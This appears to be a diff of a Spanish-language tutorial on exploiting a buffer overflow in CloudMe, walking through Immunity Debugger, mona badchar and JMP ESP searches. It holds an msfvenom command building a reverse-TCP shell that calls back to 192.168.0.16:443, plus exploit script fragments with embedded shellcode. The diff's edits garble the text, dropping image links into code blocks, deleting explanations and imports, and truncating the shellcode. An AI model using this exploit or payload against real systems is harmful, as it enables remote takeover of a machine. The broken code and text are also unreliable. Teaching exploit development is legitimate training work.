@@ -275,10 +275,8 @@ if __name__ == "__main__":
 
 Ejecutando el script vemos que el CloudMe para de functionnar el la maquina Windows. 
 
-```{r, echo = FALSE, fig.cap="BufferOverflow DOS", out.width="90%"}
-    knitr::include_graphics("images/Buff-DOS.png")
-```
 
+![Buff-DOS](../assets/images/Buff-DOS.png) 
 
 #### Etapa 2 : Analizando lo que pasa con Immunity Debugger {-}
 
@@ -288,10 +286,8 @@ Pinchamos en el menu File del Immunity Debugger a attach y seleccionamos el serv
 
 ```{r, echo = FALSE, fig.cap="BufferOverflow Attach service", out.width="90%"}
     knitr::include_graphics("images/Buff-ID_attach.png")
-```
 
-Cuando lo lanzamos siempre nos va a poner el servicio en *PAUSED* y tenemos que darle al boton *PLAY*.
-
+![Buff-ID_attach](../assets/images/Buff-ID_attach.png) 
 Desde la maquina victima lanzamos otra vez el exploit para ver lo que pasa.
 
 ```bash
@@ -307,20 +303,16 @@ En el Immunity debugger podemos ver que se a vuelto a PAUSEAR y en la ventanita 
     knitr::include_graphics("images/Buff-stack_explanation.png")
 ```
 
-En el graphico vemos las **A** que es lo que suele passar cuando le enviamos data al programma, en este casso **A**. Si el buffer
-definido no esta sanitizado correctamente y que le enviamos mas **A** de lo previsto, las **A** van subiendo hasta que sobre escriba
-registros como el **EBP** y el **RET tambien llamado EIP**. Lo podemos ver en el Immunity Debugger aqui.
 
+![Buff-stack_exlaatio](../assets/images/Buff-stack_explanation.png) 
 ```{r, echo = FALSE, fig.cap="BufferOverflow overflow with A", out.width="90%"}
     knitr::include_graphics("images/Buff-As.png")
 ```
 
 Aqui se puede ver un monton de "41414141" que 41 es el valor Hexadecimal ASCII de la lettra A. 
 
-Lo critico aqui es cuando el atacante toma el control del **EIP (RET)** porque el **EIP** define donde appunta la siguiente instruccion a 
-ejecutar. En el caso de las **A**, el programma cuando llega al EIP piensa que la siguiente instruccion que hay que ejecutar se encuentra en
-la Memory Address 0x41414141 (porque la hemos sobre escrito), y claro como esta direccion no existe hace que el programma pete.
 
+![Buff-As](../assets/images/Buff-As.png) 
 #### Etapa 3: Sobre escribir el EIP {-}
 
 Como atacante, ahora tenemos que saver cuantas **A** tenemos que meter para sobre escribir el **EIP** con el valor que nosotros queremos meter.
@@ -475,10 +467,8 @@ Tenemos que empezar por buscar estos **BadChars**.
 
     ```bash
     !mona bytearray -cpb "\x00"
-    ```
-
-    Aqui mona nos crea un fichero llamado bytearray` en el escritorio que contiene todos los valores en Hex del 01 al FF. Por prevencion
     quittamos de entrada el caracter `x00` que es un **BadChars** bastante commun.
+![Buff-moa_set_wdir](../assets/images/Buff-mona_set_wdir.png) 
 
 1. Enviamos todos estos caracteres en la pila para ver en que punto, o mejor dicho que carateres hacen quel programa pete.
 
@@ -532,10 +522,8 @@ Tenemos que empezar por buscar estos **BadChars**.
 
 En el caso que nos reporte **BadChars** tendriamos que quitarlos de la lista y volver a effectuar lo mismo hasta que no
 tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso con la lista de caracteres que tenemos. En 
-este caso no hay **BadChars** pero le quitaremos siempre el `\x00` por precaucion.
 
-#### Etapa 6: Creacion del shell code malicioso {-}
-
+![Buff-BadChars](../assets/images/Buff-BadChars.png) 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
 ```
@@ -552,10 +540,8 @@ import signal
 import pdb
 import sys
 import time
-from pwn import *
-from struct import pack
-
 # Variables globales
+![Buff-Shell-code](../assets/images/Buff-Shell-code.png) 
 remoteAddress = "127.0.0.1"
 
 def executeExploit():
@@ -613,10 +599,8 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     ```
 
 1. Buscamos una dll que tenga todas las protecciones a False
-
-    ```{r, echo = FALSE, fig.cap="Buf no protected modules", out.width="90%"}
-    knitr::include_graphics("images/Buff-protection_false.png")
     ```
+![Buff-jmes](../assets/images/Buff-jmpesp.png) 
 
 1. En internet buscamos el opcode [defuse.ca](https://defuse.ca/online-x86-assembler.htm)
 
@@ -630,18 +614,14 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     !mona find -s "\xff\xe4" -m Qt5Core.dll
     ```
 
-1. Seleccionar una direccion que tenga derechos de ejecucion
-
-    ```{r, echo = FALSE, fig.cap="Buf exec right jmpesp", out.width="90%"}
     knitr::include_graphics("images/Buff-execution-rights-jmpesp.png")
+![Buff-rotectio_false](../assets/images/Buff-protection_false.png) 
     ```
 
 1. Cambiamos el script poniendole la nueva direccion
 
-    ```python
-    #!/usr/bin/python3
-
     import socket
+![Buff-rotectio_false](../assets/images/Buff-protection_false.png) 
     import signal
     import pdb
     import sys
@@ -652,10 +632,8 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     # Variables globales
     remoteAddress = "127.0.0.1"
 
-    def executeExploit():
-        shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
-            b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
             b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
+![Buff-executio-rihts-jmes](../assets/images/Buff-execution-rights-jmpesp.png) 
             b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
             b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
             b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
